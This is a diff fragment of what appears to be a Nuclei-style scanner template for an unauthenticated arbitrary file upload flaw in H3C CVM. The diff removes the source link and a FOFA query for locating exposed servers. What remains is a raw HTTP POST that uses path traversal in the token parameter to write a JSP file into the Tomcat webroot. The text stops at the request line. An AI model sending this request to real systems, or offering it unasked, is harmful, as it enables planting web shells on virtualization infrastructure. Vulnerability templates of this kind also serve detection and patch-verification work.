@@ -3,12 +3,8 @@ info:
   name: H3C CVM upload前台任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kkaw8yemvnqqv7f9'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kkaw8yemvnqqv7f9
-    fofa: server="H3C-CVM"
 http:
 - raw:
   - 'POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/a.jsp&name=123 HTTP/1.1
